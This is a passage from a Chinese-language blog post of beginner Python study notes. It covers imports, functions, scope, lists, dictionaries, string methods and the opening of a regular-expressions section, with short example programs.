input(),print(),len()等.Python 也包括一组模块,称为”标准库”每个模块都是一个Python 程序,包含一组相关的函数,可以直接嵌入程序之中.</p><p>使用 <code>import</code> 语句 导入模块</p><ul><li>import 关键字</li><li>模块的名称</li><li>可选的更多模块名称,用逗号隔开</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>因为<code>randint()</code>函数是<code>random</code>模块中的,所有必须在<code>randint</code>前面加上<code>random.</code>前缀,告诉Python 在random模块中寻找这个函数</p><p><strong>from import 语句</strong></p><ul><li>from 关键字,后面 是模块名称</li><li>import 关键字, 和一个<code>*</code> 星号</li></ul><p>使用这种import 语句,就不需要在使用模块中的函数时,在函数前面加上<code>模块名称.</code>的前缀</p><p><strong>使用<code>sys.exit()</code> 提前结束程序</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Type exit to exit.'</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> response <span class="token operator">==</span> <span class="token string">'exit'</span><span class="token punctuation">:</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'u typed'</span> <span class="token operator">+</span> response <span class="token operator">+</span> <span class="token string">'.'</span><span class="token punctuation">)</span></code></pre><p>因为<code>sys.exit()</code>是在<code>sys</code>模块中,所以必须导入sys模块</p><p><code>abs()</code>函数返回数字的绝对值</p><h1 id="0x03-函数"><a href="#0x03-函数" class="headerlink" title="0x03    函数"></a>0x03    函数</h1><p>在Python 中,除了内建函数<code>print()</code>这些以外,用户还可以自己定义函数,使用<code>def</code>来定义函数</p><p><strong><code>def</code>语句和参数</strong></p><p>在函数的括号里面的值就叫做参数.</p><pre class=" language-Python"><code class="language-Python">def hello(name):    print('hello ' + name)hello('aa')hello('bb')</code></pre><p>自定义的函数hello中,name就是<code>变元</code>,变元是一个变量,当函数被调用时,参数就存放在其中.<strong>保存在变元中的值,在函数返回后就丢失了.</strong></p><p><strong>返回值和 return 语句</strong></p><p><em>一般来说,函数调用求值的结果,就称为函数的”返回值”</em></p><p>用<code>def</code> 语句创建函数时, 可以用<code>return</code> 语句指定应该返回的值</p><p>return语句包含</p><ul><li>return 关键字</li><li>函数应该返回的值或表达式</li></ul><p>*<em>None 值 *</em></p><p>Python 中有个值称为<code>None</code>, 表示没有值. None 是NoneType 数据类型的唯一值(其他编程语言可能称这个值为null,nil或undefined)</p><p>如果<strong>只</strong>使用了 return关键字本身,就返回<code>None</code></p><p><strong>关键字参数和 print()</strong></p><p>比如在print()函数中,因为print()函数自动在传入的字符串末尾添加了换行符,但是可以通过添加<strong>关键字参数</strong>来改变他的返回值</p><p>比如</p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'World'</span><span class="token punctuation">)</span></code></pre><p>的输出就是<code>HelloWorld</code> ,因为Hello后面不再打印换行,而是空字符串.如果不添加关键字参数(<code>end=&#39;&#39;</code>)就是换行后的结果.</p><p><code>sep=&#39;&#39;</code> 传入sep关键字,可以替换默认的分隔字符串</p><p><img src="https://i.loli.net/2020/02/05/EBolj1NTDnWmxwX.png" alt></p><p><strong>局部和全局作用域</strong></p><p>在<strong>被调用函数内赋值</strong>的变元和变量，处于该函数的“<strong>局部</strong>作用域”。在<strong>所有函数之外</strong>赋值的变量，属于“<strong>全局</strong>作用域”。处于局部作用域的变量，被称为“局部变量”。处于全局作用域的变量，被称为“全局变量”。一个变量必是其中一种，不能既是局部的又是全局的</p><p>可以将“作用域”看成是变量的容器。当作用域被销毁时，所有保存在该作用域内的变量的值就被丢弃了.</p><ul><li>全局作用域中的代码不能使用任何局部变量</li><li>局部作用域可以访问全局变量</li><li>局部作用域中代码不能使用其他局部作用域的变量</li><li>在不同的作用域中可以用相同的名字来命名变量</li></ul><pre class=" language-Python"><code class="language-Python">def spam():    eggs = 12312 #eggs  是函数spam()内的局部变量.当程序执行从spam返回后,该局部作用域就被销毁了spam()print(eggs)故报错为    print(eggs)NameError: name 'eggs' is not defined</code></pre><p><strong>global语句</strong></p><p>用<code>global</code>可以在函数内修改局部变量为全局变量</p><p>Python 中,错误可以通过<code>try</code>和<code>except</code>语句来处理,可能出错的语句就放入<code>try</code>子句中.如果错误发生,程序执行就转到接下来的<code>except</code>子句开始处.一旦执行了exceot子句的代码,就不会再回到try子句中,程序继续向下执行</p><pre class=" language-Python"><code class="language-Python">#This is a guess the number game.import randomsecretNum = random.randint(1,20)print('I am thinking of a number between 1 and 20.')#Ask the playe to guess 6 times.for guessesTaken in range(1,7):    print('take a guess.')    guess = int(input())    if guess < secretNum:        print('too low')    elif guess > secretNum:        print('too high')    else:        break # this condition is the correct guess.if guess == secretNum:    print('good job.u guessed my num in ' + str(guessesTaken) + 'guesses!')else:    print('Nope.The num  was thinking of was ' + str(secretNum))</code></pre><p>第三章项目实践</p><pre class=" language-PYTHON"><code class="language-PYTHON">#第三章项目实践import randomprint('Plese input a intxxx')def collatz(Num):    if Num % 2 == 0:# 表示 Num 为偶数        print(Num//2)    elif Num % 2 == 1:# 表示 Num 为奇数        print(3*Num + 1)#Ask user to type the Numtry:    Num = int(input())    collatz(Num)except:    print('ValueError.Must int.')</code></pre><h1 id="0x04-列表"><a href="#0x04-列表" class="headerlink" title="0x04    列表"></a>0x04    列表</h1><p><a href="https://blog.csdn.net/qq_36090423/article/details/88048556" target="_blank" rel="noopener">两个list列表元素 一一对应拼接</a></p><p>“列表” 是一个值, 包含多个字构成的序列.术语”列表值” 指的是列表本身,作为一个值,可保存给变量,而不是列表中的内容值.列表就是<code>[]</code>这个东西.里面的值称为”表项”,用逗号分隔.</p><p><code>[]</code>是一个空列表</p><p><strong>用下标取得列表中的单个值</strong></p><p>列表后面括号内的整数被称为”下标” ,列表中第一个值的下标是0,以此类推.下标只能是整数.</p><p>列表也能包含其他列表值,可以通过多重下标的方式来访问.有点像二维数组的味道.<strong>第一个下标表名使用哪个列表值,第二个下标表明该列表值中的值</strong></p><p>*<em>负数下标 *</em></p><p>整数值<code>-1</code> 指的是列表中的最后一个下标,<code>-2</code>指的是列表中倒数第二个下标,以此类推.</p><p><strong>利用切片取得字列表</strong></p><p>下标可以从列表中取得单个值,”切片”可以从列表中取得多个值,结果是一个新列表.就像这样<code>spam[1:4]</code></p><p>第一个整数是切片开始出的下标,第二个整数是切片结束处的下标.切片向上增长,直到第二个下标的值,但不包括.</p><p>作为快捷方法，可以省略切片中冒号两边的一个下标或两个下标。<strong>省略第一个下标相当于使用 0，或列表的开始。省略第二个下标相当于使用列表的长度，意味着分片直至列表的末尾</strong></p><p>使用<code>len()</code>来获取列表的长度</p><p>用下标还可以改变列表中的值,有点类似覆盖掉的意思</p><p><code>+</code>操作符可以连接两个列表.<code>*</code>操作符可以用来复制列表</p><p>可以使用<code>del</code>语句从列表中删除值,也可以作用于变量,删除它,作用就像是”取消赋值”的语句.但是几乎用不到删除变量</p><p><strong>in 和 not in 操作符</strong></p><p>利用<code>in</code>和<code>not in</code>操作符可以确定一个值是否在列表中.</p><p>用法是连接两个值,一个是要查找的值,一个是待查找的列表比如<code>&#39;web&#39; in CTF</code> </p><p><strong>多重赋值技巧</strong></p><p>即在一行代码中,利用列表中的值作为多个变量赋值</p><p><strong>增强的赋值操作</strong></p><table><thead><tr><th align="center">spam += 1</th><th>spam = spam + 1</th></tr></thead><tbody><tr><td align="center">spam -= 1</td><td>spam = spam -1</td></tr><tr><td align="center">spam *= 1</td><td>spam = spam * 1</td></tr><tr><td align="center">spam /= 1</td><td>spam = spam / 1</td></tr><tr><td align="center">spam % = 1</td><td>spam = spam %1</td></tr></tbody></table><p><code>+=</code>操作符可以完成字符串和列表的连接.<code>*=</code>操作符可以完成字符串和列表的复制</p><p>*<em>方法 *</em></p><p>方法就是函数,只是方法是调用在一个值上.</p><p>用<code>index()</code>方法在列表中查找值</p><pre><code>&gt;&gt;&gt; spam[&#39;misc&#39;, &#39;pwn&#39;, &#39;web&#39;, &#39;re&#39;, &#39;bin&#39;, &#39;misc&#39;, &#39;pwn&#39;, &#39;web&#39;, &#39;re&#39;, &#39;bin&#39;]&gt;&gt;&gt; spam.index(&#39;web&#39;)2ValueError: &#39;ddw&#39; is not in list</code></pre><p>如果这个值不在列表中,Python就会报<code>ValueError</code></p><p>如果列表中存在<strong>重复</strong>的值,就返回<strong>第一次</strong>出现的下标.</p><p>用<code>append()</code>和<code>insert()</code>方法在列表中添加值</p><p><code>append()</code>方法调用,将参数添加到列表末尾.</p><p><code>insert()</code>方法的第一个参数是新值的下标,第二个参数是要插入的新值</p><p>方法属于单个数据类型,<code>append()</code>和<code>insert()</code>方法是列表方法,只能在列表中调用,不能在其他值上调用.</p><p>用<code>remove()</code>方法从列表中删除值,如果删除的值出现多次,只删除第一次出现的值</p><p>如果知道下标,使用<code>del</code>语句</p><p>用<code>sort()</code>方法将列表中的值排序</p><pre><code>&gt;&gt;&gt; num[1, 2, 3, 5, 7, 8, 9, 123, 33, 12]&gt;&gt;&gt; num.sort()&gt;&gt;&gt; num[1, 2, 3, 5, 7, 8, 9, 12, 33, 123]</code></pre><p> 当指定<code>reverse</code>关键字参数为<code>True</code>时,可以让sort()按逆序排序</p><pre><code>&gt;&gt;&gt; num.sort(reverse=True)&gt;&gt;&gt; num[123, 33, 12, 9, 8, 7, 5, 3, 2, 1]</code></pre><p>不能对列表中同时有数字和字符串的列表进行排序,sort()进行排序时,使用的是<code>ASCII</code>字符顺序,而不是实际的字典顺序,就说明了大写字母排在小写字母之前</p><p>续行指令<code>\</code> ,即 这条指令在下一行继续的意思</p><p><strong>可变和不可变数据类型</strong></p><p>列表是可变数据,字符串是不可变的.而”改变”一个字符串的正确方式,是使用<strong>切片和连接</strong>.</p><p><strong>元组数据类型</strong></p><p>元组输入时用圆括号<code>()</code>,是不可变的.其他都很列表一样.</p><p>使用<code>list()</code>和<code>tuple()</code>函数来转换类型</p><p>这两个函数将返回 传递给它们的值的列表和元组版本</p><p><strong>引用</strong></p><p>变量可以直接引用他的值,但是列表赋值给变量,只是将列表的”引用”赋值给了这个变量.</p><p><strong>传递引用</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">eggs</span><span class="token punctuation">(</span>someParameter<span class="token punctuation">)</span><span class="token punctuation">:</span>    someParameter<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span>spam <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>eggs<span class="token punctuation">(</span>spam<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>spam<span class="token punctuation">)</span></code></pre><p><strong>copy 模块 和 copy() 和 deepcopy()函数</strong></p><p><code>copy.copy()</code>函数用来赋值列表或者字典这样的<strong>可变值</strong>,而不是复制引用.</p><pre><code>&gt;&gt;&gt; import copy&gt;&gt;&gt; spam = [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;]&gt;&gt;&gt; spam[&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;]&gt;&gt;&gt; cheese = copy.copy(spam)&gt;&gt;&gt; cheese[0]=42&gt;&gt;&gt; spam[&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;]&gt;&gt;&gt; cheese[42, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;]</code></pre><p><code>deepcopy()</code>函数将同时复制内部的列表</p><p>这两个函数的区别</p><p><a href="https://blog.csdn.net/u011630575/article/details/78604226" target="_blank" rel="noopener">https://blog.csdn.net/u011630575/article/details/78604226</a></p><blockquote><p>如果需要对一个变量中的列表修改，同时不修改原来的列表，就可以用 copy()或 deepcopy()。</p></blockquote><h1 id="0x05-字典和结构化数据"><a href="#0x05-字典和结构化数据" class="headerlink" title="0x05    字典和结构化数据"></a>0x05    字典和结构化数据</h1><p>字典的索引称为”键”,键及其关联的值称为”键-值”对.</p><p>字典就是<code>{}</code>这种带花括号的,和JSON格式类似</p><p>比如定义一个mybook字典,<code>mybook = {&#39;who&#39; : &#39;Dingins&#39;,&#39;where&#39; : &#39;England&#39;}</code></p><p>然后通过字典的键来访问字典,<code>mybook[&#39;who&#39;]</code> 返回的值就是<code>Dingins</code> ,当然也可以用整数值作为键,但是可以任何值作为第一个键,不一定是0</p><p>字典中的表项是不排序的,</p><p><code>keys()</code>,<code>values()</code>,<code>item()</code>方法对应返回字典的键,值,键-值对.返回的值可以用于for循环。<code>item()</code>方法返回的dict_items值,是包含键和值的元组.</p><p>如果想获得一个列表,就把返回的值传递给<code>list()</code>函数.同样的,也可以利用<code>in</code>和<code>not in</code>操作符检查值是否存在列表中.</p><p><code>get()</code>方法</p><p>有两个参数,要取得值的键,如果键不存在,返回备用的值</p><pre><code>&gt;&gt;&gt; mycat.get(&#39;flag&#39;,&#39;flag&#39;)#flag不存在字典中,故设置一个flag为备用&#39;flag&#39;&gt;&gt;&gt; mycat{&#39;size&#39;: &#39;fat&#39;, &#39;color&#39;: &#39;white&#39;, &#39;sex&#39;: &#39;boy&#39;}</code></pre><p><code>setdefault()</code>方法</p><p>当键没有任何值的时候使用的默认值.第一个参数为要检查的键,第二个参数是该键不存在时要设置的值.</p><p><strong>漂亮打印</strong></p><p>导入<code>pprint</code>模块,其中有<code>pprint()</code>函数,输出时每一个键值对都会换行</p><p><strong>嵌套的字典和列表</strong></p><p>顾名思义,不多做解释.</p><p>第五章项目实践</p><pre class=" language-python"><code class="language-python">have <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'rope'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'torch'</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'gold coin'</span><span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token string">'dagger'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'arrow'</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">displayInventory</span><span class="token punctuation">(</span>inventory<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Inventory:'</span><span class="token punctuation">)</span>    item_total <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment" spellcheck="true"># 定义总数,刚开始为0</span>    <span class="token keyword">for</span> k <span class="token punctuation">,</span> v <span class="token keyword">in</span> inventory<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 利用 for 循环遍历字典中的值,键</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> k<span class="token punctuation">)</span>        item_total <span class="token operator">+=</span> v    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Total number of items: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>item_total<span class="token punctuation">)</span><span class="token punctuation">)</span>displayInventory<span class="token punctuation">(</span>have<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 字典作为参数</span></code></pre><h1 id="0x06-字符串操作"><a href="#0x06-字符串操作" class="headerlink" title="0x06    字符串操作"></a>0x06    字符串操作</h1><blockquote><p>处理字符串</p></blockquote><p>可以使用<code>&quot;&quot;</code>双引号来使用字符串中的单引号,字符串从双引号开始,单引号只是字符串的一部分.</p><p><strong>转义字符</strong></p><p><code>\</code>紧跟着要添加到字符串中的字符.比如转义单引号<code>\&#39;</code>这样就可以在单引号中的字符串使用单引号</p><table><thead><tr><th align="center"><code>\&#39;</code></th><th>单引号</th></tr></thead><tbody><tr><td align="center"><code>\&quot;</code></td><td>双引号</td></tr><tr><td align="center"><code>\t</code></td><td>制表符</td></tr><tr><td align="center"><code>\n</code></td><td>换行符</td></tr><tr><td align="center"><code>\\</code></td><td>倒斜杠</td></tr></tbody></table><p><strong>原始字符串</strong></p><p>在字符串开始的引号之前加上<code>r</code>,就可以使该字符串成为原始字符串.<strong>原始字符串完全忽略所有的转义字符</strong></p><pre><code>&gt;&gt;&gt; print(r&#39;\ts\&#39;s&#39;)\ts\&#39;s</code></pre><p><strong>用三重引号的多行字符串</strong></p><p>“三重引号”之间的所有引号,制表符或换行都被认为是字符串的一部分</p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''Dear Alice,eve's cat has beenSincerely,Bob'''</span><span class="token punctuation">)</span></code></pre><p>输出如下</p><pre><code>Dear Alice,eve&#39;s cat hasbennSincerely,Bob</code></pre><p><strong>多行注释</strong></p><p><code>#</code> 是一行注释,多行注释使用三个双引号<code>&quot;&quot;&quot; test</code></p><p><strong>字符串下标和切片</strong></p><p>字符串像列表一样,使用下标和切片.</p><p>空格和其他符合也会被计数</p><pre><code># 下标操作&gt;&gt;&gt; spam = &#39;Hello world!&#39;&gt;&gt;&gt; spam[0]&#39;H&#39;&gt;&gt;&gt; spam[5]&#39; &#39; # 这是空格# 切片操作&gt;&gt;&gt; fizz = spam[:3]&gt;&gt;&gt; fizz&#39;Hel&#39;</code></pre><p><strong>字符串的 in 和 not in 操作符</strong></p><p>用 in 或 not in 连接两个字符串得到的表达式，将求值为布尔值 True 或 False</p><p><strong>字符串方法upper(),lower(),isupper()和islower()</strong></p><p>upper()和 lower()字符串方法返回一个新字符串，其中原字符串的所有字母都被相应地转换为大写或小写。字符串中非字母字符保持不变</p><p>这些方法都不改变字符串本身,只是返回一个新字符串.如果要改变字符串本身,可以将这个返回值赋给原来的变量</p><p>如果字符串至少有一个字母，并且所有字母都是大写或小写，isupper()和islower()方法就会相应地返回布尔值 True。否则，该方法返回 False</p><p><strong>isX 字符串方法</strong></p><p>这些方法都是返回一个布尔值,描述了字符串的特点.</p><ul><li>isalpha()返回 True，如果字符串只包含字母，并且非空； </li><li>isalnum()返回 True，如果字符串只包含字母和数字，并且非空；</li><li>isdecimal()返回 True，如果字符串只包含数字字符，并且非空；</li><li>isspace()返回 True，如果字符串只包含空格、制表符和换行，并且非空；</li><li>istitle()返回 True，如果字符串仅包含以大写字母开头、后面都是小写字母的单词。</li></ul><p><strong>字符串方法 <code>startswith()</code> 和 <code>endswith()</code></strong></p><p>startswith()和 endswith()方法返回 True，如果它们所调用的字符串以该方法传入的字符串开始或结束.否则，方法返回 False</p><p><strong>字符串方法 <code>join()</code> 和<code>split()</code></strong></p><p><code>join()</code>方法用于连接字符串列表.join()方法在一个字符串上调用，参数是一个字符串列表，返回一个字符串,<strong>返回的字符串由传入的列表中每个字符串连接而成</strong></p><p>调用 join()方法的字符串，被插入到列表参数中每个字符串的<strong>中间</strong></p><pre><code>&gt;&gt;&gt; &#39;-&#39;.join([&#39;hello&#39;,&#39;hi&#39;,&#39;nihao&#39;])&#39;hello-hi-nihao&#39;</code></pre><p>split()方法做的事情正好相反：它<strong>针对一个字符串调</strong></p><p><strong>用，返回一个字符串列表</strong></p><pre><code>&gt;&gt;&gt; &#39;My name is baba&#39;.split()[&#39;My&#39;, &#39;name&#39;, &#39;is&#39;, &#39;baba&#39;]</code></pre><p>可以向 split()方法传入一个分割字符串，指定它按照不同的字符串分割</p><pre><code>&gt;&gt;&gt; &#39;Myabcisabcbaba&#39;.split(&#39;abc&#39;)[&#39;My&#39;, &#39;is&#39;, &#39;baba&#39;]</code></pre><p><code>split()</code>最常用的是传入<code>\n</code>按照换行符分隔多行字符串</p><p><strong><code>rjust(),ljust(),center()</code>方法对齐文本</strong></p><p>rjust()和 ljust()字符串方法返回调用它们的字符串的填充版本，通过插入空格来对齐文本。这两个方法的第一个参数是一个整数长度，用于对齐字符串,第二个可选参数将指定一个填充字符，取代空格字符</p><pre><code>&gt;&gt;&gt; &#39;hello&#39;.rjust(10)&#39;     hello&#39;</code></pre><p><code>rjust()</code>是右对齐,故在右边加上5个空格</p><pre><code>&gt;&gt;&gt; &#39;there is no flag&#39;.ljust(20,&#39;*&#39;)&#39;there is no flag****&#39;</code></pre><p><code>center()</code>方法让文本居中</p><pre><code>&gt;&gt;&gt; &#39;there is no flag&#39;.center(30,&#39;*&#39;)&#39;*******there is no flag*******&#39;</code></pre><p><strong>用 strip()、rstrip()和 lstrip()删除空白字符</strong></p><p>strip()字符串方法将返回一个新的字符串，它的开头或末尾都没有空白字符.lstrip()和 rstrip()方法将相应删除左边或右边的空白字符.</p><pre><code>&gt;&gt;&gt; t.rstrip()&#39;  t q l&#39;&gt;&gt;&gt; t.lstrip()&#39;t q l  &#39; </code></pre><p><strong>用 pyperclip 模块拷贝粘贴字符串</strong></p><p><code>pyperclip</code>模块有<code>copy()</code>和<code>paste()</code>可以向计算机的剪贴板发送文本，或从它接收文本</p><pre><code>&gt;&gt;&gt; import pyperclip&gt;&gt;&gt; pyperclip.copy(&#39;Hello world!&#39;)&gt;&gt;&gt; pyperclip.paste()&#39;Hello world!&#39;</code></pre><p>如果在Pystorm中使用的话,执行代码后 Ctrl+v 后的结果是一样的</p><p>交互式环境也就是<code>IDLE</code>,<code>#TODO:</code>TODO注释是提醒,要完成的部分程序.</p><p>第六章项目之一</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pypercliptext <span class="token operator">=</span> pyperclip<span class="token punctuation">.</span>paste<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># TODO: separate lines and add stars.</span>lines <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>lines<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># loop</span>    lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'* '</span> <span class="token operator">+</span> lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># add stars to each string</span>text <span class="token operator">=</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>lines<span class="token punctuation">)</span>pyperclip<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span></code></pre><p>lines 列表现在包含修改过的行，每行都以星号开始。但 pyperclip.copy()需要一个字符串，而不是字符串的列表。要得到这个字符串，就要将 lines 传递给 join 方法</p><h1 id="第二部分-自动化任务"><a href="#第二部分-自动化任务" class="headerlink" title="第二部分: 自动化任务"></a>第二部分: 自动化任务</h1><h1 id="0x07-模式匹配与正则表达式-是重点"><a href="#0x07-模式匹配与正则表达式-是重点" class="headerlink" title="0x07    模式匹配与正则表达式(是重点!)"></a>0x07    模式匹配与正则表达式(是重点!)</h1><p>正则表达式，简称为 regex，是文本模式的描述方法</p><p>Python 中所有的正则表达式的函数都在<code>re</code>模块中</p><p><code>import re</code> 导入re模块</p><p>向 re.compile()传入一个字符串值，表示正则表达式，它将返回一个 Regex 模式对象（或者就简称为 Regex 对象）</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> re<span class="token operator">>></span><span class="token operator">></span> phoneNunRegex <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\d\d\d-\d\d\d-\d\d\d\d'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> mo <span class="token operator">=</span> phoneNunRegex<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'My number is 415-666-6666.'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Phone number found: '</span> <span class="token operator">+</span> mo<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Phone number found<span class="token punctuation">:</span> <span class="token number">415</span><span class="token operator">-</span><span class="token number">666</span><span class="token operator">-</span><span class="token number">6666</span></code></pre><p>变量名mo 是一个通用的名称,用于Match 对象.</p><p>注意,在Python 正则匹配中,在字符串前面使用<code>r</code>比用<code>\</code>转义字符更容易.</p><ol><li>import re 导入正则表达式模块</li><li>用re.compile()函数创建一个Regex 对象(使用原始字符串)</li><li>向 Regex 对象的 search()方法传入想查找的字符串.它返回一个 Match 对象</li><li>调用 Match 对象的 group()方法，返回实际匹配文本的字符串</li></ol><p><strong>用括号分组,每一个括号表示一组</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> re<span class="token operator">>></span><span class="token operator">></span> phoneNumRegex <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'(\d\d\d)-(\d\d\d)-(\d\d\d\d)'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> mo <span class="token operator">=</span> phoneNumRegex<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'My number is 123-456-7890.'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> mo<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">'123'</span><span class="token operator">>></span><span class="token operator">></span> mo<span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span> <span class="token string">'456'</span><span class="token punctuation">,</span> <span class="token string">'7890'</span><span class="token punctuation">)</span></code></pre><p><strong>用管道符匹配多个分组</strong></p><p>用<code>|</code>可以匹配多个分组,<strong>第一次出现的匹配文本</strong>将作为Match对象返回.</p><p>如果需要匹配管道符,使用转义字符就行了.<code>\|</code></p><p><strong>用问号实现可选匹配</strong></p><p>字符<code>?</code>表明它前面的分组在这个模式中是可选的,即不论这段文本在不在,正则表达式都会认为匹配</p><p>也可以认为<code>?</code>表示匹配问号之前的分组0次或1次,如果需要匹配<code>?</code>则使用转义字符<code>\?</code></p><p><strong>用星号匹配零次或多次</strong></p><p><code>*</code>(称为星号),意味着匹配0次或多次,即星号之前的分组,可以在文本中出现任意次.</p><p><strong>用加号匹配一次或多次</strong></p><p><code>+</code>前面的分组必须至少出现一次.</p><p><strong>用花括号匹配特定次数</strong></p><p>如果想要一个分组重复特定次数，就在正则表达式中该分组的后面，跟上花括号包围的数字.比如(ha){3},就匹配”hahaha”</p><p>除了匹配指定次数,还可以匹配指定范围.{min,max}表示匹配前面字符串至少min次,最多max次.</p><p><strong>贪心和非贪心匹配</strong></p><p>Python 正则表达式默认是”贪心”的.即,在有多重情况下,尽可能匹配最长的字符串.花括号的“非贪心”版本匹配<strong>尽可能最短</strong>的字符串，即在<strong>结束的花括号后跟着一个问号</strong></p><blockquote><p>问号在正则表达式中可能有两种含义：声明非贪心匹配或表示可选的分组.这两种含义是完全无关的</p></blockquote><p><code>findall()方法</code></p><p>search()将<strong>返回一个Match对象</strong>，包含被查找字符串中的“第一次”匹配的文本，而 findall()方法将<strong>返回一组字符串</strong>，包含被查找字符串中的<strong>所有匹配.</strong></p><p>如果在正则表达式中有分组，那么 findall 将返回元组的列表,其中每个项就是正则表达式中每个分支的匹配字符串.</p><p>如果没有分组,就返回匹配字符串的列表</p><p><strong>字符分类</strong></p><table><thead><tr><th>\d</th><th>0 到 9的任何数字</th></tr></thead><tbody><tr><td>\D</td><td>除0 到 9 的数字以外的任何字符</td></tr><tr><td>\w</td><td>任何字母,数字或下划线字符(可以认为是匹配”单词”)</td></tr><tr><td>\W</td><td>除了字母,数字和下划线以外的任何字符</td></tr><tr><td>\s</td><td>空格,制表符或换行符</td></tr><tr><td>\S</td><td>除空格,制表符和换行符以外的任何字符</td></tr></tbody></table><p><strong>自定义字符分类</strong></p><p>用<code>[]</code> 自定义匹配,用<code>-</code>表示字母和数字的范围.如[a-zA-Z0-9]匹配所有大小写字母和数字</p><p>通过在字符分类的左方括号后加上一个插入字符（^），就可以得到“非字符类”。非字符类将匹配不在这个字符类中的所有字符</p><p><strong>插入字符和美元字符</strong></p><p>在正则表达式的开始处使用插入符号（<code>^</code>），表明匹配必须发生在被查找文本<strong>开始处</strong></p><p>可以再正则表达式的末尾加上美元符号（<code>$</code>），表示该字符串<strong>必须以这个正则表达式的模式结束</strong></p><p><strong>通配字符</strong></p><p>在正则表达式中,<code>.</code>字符称为”通配符”.,表示匹配除了换行之外的所有字符.<strong>句点字符只匹配一个字符</strong></p><pre><code>&gt;&gt;&gt; atRegex = 